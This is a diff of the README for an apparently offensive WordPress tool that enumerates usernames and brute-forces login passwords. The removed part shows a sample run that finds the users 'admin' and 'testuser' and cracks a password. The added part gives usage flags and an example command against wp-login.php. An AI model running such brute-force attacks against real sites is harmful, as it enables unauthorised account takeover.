@@ -6,20 +6,13 @@ Wordpress user enumeration and password bruteforce.
 
 #User Enumeration:
 
-$ ./wpbrute.sh --url=www.example.com
+usage: python2 wp.py -t [target] -u [user] -w [passlist]
 
-[+] Username or nickname enumeration
-admin
-testuser
-
-
-#Password Bruteforce:
-
-$ ./wpbrute.sh --url=www.example.com --user=admin --wordlist=wordlist.txt
-
-[+] Bruteforcing user [admin]
-123456
-test123
-123test123
-The password is: 123test123
-</pre>
+optional arguments:
+  -h, --help   How User This Tool
+  -t TARGET    For Example : localhost/wordpress/wp-login.php
+  -u USER      username 0f Target
+  -w PASSLIST  address passlist for brute force
+  -r           Restore the last session of the attack
+#Example:
+ python2 wp.py-t www.example.com/wp-login.php -u Admin -w wordlist.txt
